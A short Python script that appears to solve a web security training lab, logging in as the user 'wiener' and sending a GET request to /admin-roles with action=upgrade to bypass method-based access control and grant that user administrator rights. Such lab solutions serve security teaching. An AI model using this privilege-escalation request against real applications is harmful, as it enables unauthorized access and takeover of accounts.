#!/usr/bin/env python3
"""Method-based access control can be circumvented"""

from lab_04 import Lab

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    username = "wiener"
    site.login(username=username, password="peter", csrf=csrf)
    payload = {"username": username, "action": "upgrade"}
    response = site.session.get(url=site.url + "/admin-roles", params=payload)
    print(response.status_code)

if __name__ == "__main__":
    main()
